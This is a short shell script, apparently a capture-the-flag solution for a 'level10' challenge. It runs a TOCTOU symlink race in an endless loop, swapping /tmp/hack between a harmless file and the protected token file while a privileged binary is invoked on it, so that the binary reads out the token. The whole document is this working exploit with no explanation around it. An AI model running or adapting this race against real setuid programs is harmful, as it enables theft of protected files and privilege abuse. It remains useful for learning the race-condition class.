#!/bin/sh

while true;
	do
		ln -sf /tmp/tmp /tmp/hack &
		/home/user/level10/level10 /tmp/hack 127.0.0.1 &
		ln -sf /home/user/level10/token /tmp/hack &
	done
